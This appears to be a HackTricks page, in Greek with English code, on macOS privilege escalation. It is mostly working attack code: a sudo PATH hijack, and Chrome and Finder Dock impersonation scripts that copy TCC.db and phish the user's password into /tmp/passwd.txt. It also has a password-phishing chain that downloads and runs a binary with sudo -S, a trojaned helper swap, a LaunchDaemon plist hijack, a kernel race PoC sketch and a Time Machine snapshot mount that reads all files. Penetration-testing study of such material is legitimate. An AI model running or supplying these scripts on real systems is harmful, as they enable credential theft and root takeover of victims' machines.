# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Αν ήρθατε εδώ αναζητώντας TCC privilege escalation, πηγαίνετε στο:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Σημειώστε ότι **τα περισσότερα κόλπα σχετικά με privilege escalation που επηρεάζουν Linux/Unix θα επηρεάσουν επίσης μηχανήματα MacOS**. Επομένως δείτε:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Αλληλεπίδραση χρήστη

### Sudo Hijacking

Μπορείτε να βρείτε την αρχική [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Ωστόσο, το macOS **διατηρεί** το **`PATH`** του χρήστη όταν αυτός εκτελεί **`sudo`**. Αυτό σημαίνει ότι ένας άλλος τρόπος για να πραγματοποιήσετε αυτήν την επίθεση είναι να **hijack other binaries** που το θύμα θα εκτελέσει όταν **τρέχει sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Σημειώστε ότι ένας χρήστης που χρησιμοποιεί το τερματικό είναι πολύ πιθανό να έχει εγκατεστημένο το **Homebrew**. Έτσι είναι δυνατό να υποκλέψετε ή να αντικαταστήσετε εκτελέσιμα στο **`/opt/homebrew/bin`**.

### Προσποίηση Dock

Χρησιμοποιώντας κάποια **social engineering** θα μπορούσατε να **προσποιηθείτε, για παράδειγμα, το Google Chrome** μέσα στο dock και στην πραγματικότητα να εκτελέσετε το δικό σας script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Μερικές προτάσεις:

- Ελέγξτε στο Dock αν υπάρχει Chrome, και σε αυτή την περίπτωση **αφαιρέστε** εκείνη την εγγραφή και **προσθέστε** την **ψεύτικη** **εγγραφή Chrome στην ίδια θέση** στον πίνακα του Dock.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Μερικές προτάσεις:

- Δεν μπορείτε να αφαιρέσετε το **Finder από το Dock**, οπότε αν πρόκειται να το προσθέσετε στο Dock, μπορείτε να τοποθετήσετε το ψεύτικο Finder ακριβώς δίπλα στο πραγματικό. Για αυτό χρειάζεται να **προσθέσετε την εγγραφή του ψεύτικου Finder στην αρχή του πίνακα Dock**.
- Μια άλλη επιλογή είναι να μην το τοποθετήσετε στο Dock και απλώς να το ανοίξετε — "Finder asking to control Finder" δεν είναι τόσο περίεργο.
- Μια ακόμα επιλογή για να **escalate to root without asking** τον κωδικό με ένα απαίσιο παράθυρο, είναι να κάνετε το Finder να ζητήσει πραγματικά τον κωδικό για να εκτελέσει μια ενέργεια με προνόμια:
- Ζητήστε από το Finder να αντιγράψει στο **`/etc/pam.d`** ένα νέο αρχείο **`sudo`** (Το prompt που ζητάει τον κωδικό θα υποδεικνύει ότι "Finder wants to copy sudo")
- Ζητήστε από το Finder να αντιγράψει ένα νέο **Authorization Plugin** (Μπορείτε να ελέγξετε το όνομα του αρχείου ώστε το prompt που ζητάει τον κωδικό να υποδεικνύει ότι "Finder wants to copy Finder.bundle")

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware συχνά καταχράται την αλληλεπίδραση με τον χρήστη για να **συλλάβει ένα συνθηματικό ικανό για sudo** και να το επαναχρησιμοποιήσει προγραμματιστικά. Μια συνηθισμένη ροή:

1. Εντοπίζει τον συνδεδεμένο χρήστη με `whoami`.
2. **Επαναλαμβάνει τις προτροπές κωδικού** μέχρι `dscl . -authonly "$user" "$pw"` να επιστρέψει επιτυχία.
3. Αποθηκεύει το διαπιστευτήριο (π.χ., `/tmp/.pass`) και εκτελεί ενέργειες με προνόμια με `sudo -S` (ο κωδικός μέσω stdin).

Example minimal chain:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Ο κλεμμένος κωδικός μπορεί στη συνέχεια να επαναχρησιμοποιηθεί για να **καθαρίσει την καραντίνα του Gatekeeper με `xattr -c`**, να αντιγράψει LaunchDaemons ή άλλα προνομιούχα αρχεία, και να εκτελέσει επιπλέον στάδια χωρίς αλληλεπίδραση.

## Νεότερα macOS-specific vectors (2023–2025)

### Αποσυρμένο `AuthorizationExecuteWithPrivileges` εξακολουθεί να λειτουργεί

`AuthorizationExecuteWithPrivileges` αποσυρθεί στο 10.7 αλλά **εξακολουθεί να λειτουργεί σε Sonoma/Sequoia**. Πολλοί εμπορικοί updaters καλούν το `/usr/libexec/security_authtrampoline` με ένα untrusted path. Εάν το target binary είναι user-writable μπορείτε να φυτέψετε ένα trojan και να εκμεταλλευτείτε το legitimate prompt:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Συνδυάστε με τα **masquerading tricks above** για να παρουσιάσετε έναν πειστικό διάλογο κωδικού πρόσβασης.

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Εάν ένα LaunchDaemon plist ή ο στόχος του `ProgramArguments` είναι **user-writable**, μπορείτε να κλιμακώσετε τα προνόμια αντικαθιστώντας το και αναγκάζοντας το launchd να ξαναφορτώσει:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Αυτό αντικατοπτρίζει το μοτίβο εκμετάλλευσης που δημοσιεύτηκε για **CVE-2025-24085**, όπου ένα writable plist καταχράστηκε για να εκτελέσει κώδικα επιτιθέμενου ως root.

### XNU SMR credential race (CVE-2025-24118)

A **race in `kauth_cred_proc_update`** επιτρέπει σε τοπικό επιτιθέμενο να καταστρέψει τον δείκτη διαπιστευτηρίων μόνο για ανάγνωση (`proc_ro.p_ucred`) ανταγωνιζόμενος τους βρόχους `setgid()`/`getgid()` ανάμεσα σε threads μέχρι να συμβεί ένα torn `memcpy`. Η επιτυχής καταστροφή αποδίδει **uid 0** και πρόσβαση στη μνήμη του kernel. Ελάχιστη δομή PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Συνδυάστε με heap grooming για να τοποθετήσετε ελεγχόμενα δεδομένα όπου ο pointer διαβάζεται ξανά. Σε ευάλωτα builds αυτό είναι ένας αξιόπιστος **local kernel privesc** χωρίς απαίτηση παράκαμψης SIP.

### Παράκαμψη SIP μέσω Migration assistant ("Migraine", CVE-2023-32369)

Ακόμα κι αν έχετε ήδη root, το SIP εξακολουθεί να μπλοκάρει εγγραφές σε συστημικές τοποθεσίες. Το bug **Migraine** καταχράται το entitlement του Migration Assistant `com.apple.rootless.install.heritable` για να ξεκινήσει μια child process που κληρονομεί την παράκαμψη SIP και αντικαθιστά προστατευμένα μονοπάτια (π.χ. `/System/Library/LaunchDaemons`). Η αλυσίδα:

1. Αποκτήστε root σε ένα ζωντανό σύστημα.
2. Προκαλέστε το `systemmigrationd` με κατασκευασμένη κατάσταση ώστε να εκτελέσει ένα attacker-controlled binary.
3. Χρησιμοποιήστε το κληρονομημένο entitlement για να τροποποιήσετε SIP-protected αρχεία, που παραμένουν ακόμα και μετά από επανεκκίνηση.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Πολλοί Apple daemons δέχονται αντικείμενα **NSPredicate** μέσω XPC και ελέγχουν μόνο το πεδίο `expressionType`, το οποίο είναι ελεγχόμενο από τον attacker. Με τη δημιουργία ενός predicate που αξιολογεί αυθαίρετους selectors μπορείτε να πετύχετε **code execution in root/system XPC services** (π.χ. `coreduetd`, `contextstored`). Σε συνδυασμό με αρχική app sandbox escape, αυτό δίνει **privilege escalation χωρίς προτροπές χρήστη**. Αναζητήστε XPC endpoints που απο-σειριοποιούν predicates και στερούνται ενός αξιόπιστου visitor.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (ακόμα και μη εξουσιοδοτημένοι) μπορεί να δημιουργήσει και να mount-άρει ένα Time Machine snapshot και να **έχει πρόσβαση ΣΕ ΟΛΑ τα αρχεία** αυτού του snapshot.\
Το **μόνο privilege** που απαιτείται είναι η εφαρμογή που χρησιμοποιείται (όπως `Terminal`) να έχει **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), το οποίο πρέπει να χορηγηθεί από admin.

<details>
<summary>Τοποθέτηση στιγμιότυπου Time Machine</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Μια πιο λεπτομερής εξήγηση μπορείτε να βρείτε στο [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Ευαίσθητες Πληροφορίες

Αυτό μπορεί να είναι χρήσιμο για κλιμάκωση προνομίων:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Αναφορές

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)

{{#include ../../banners/hacktricks-training.md}}
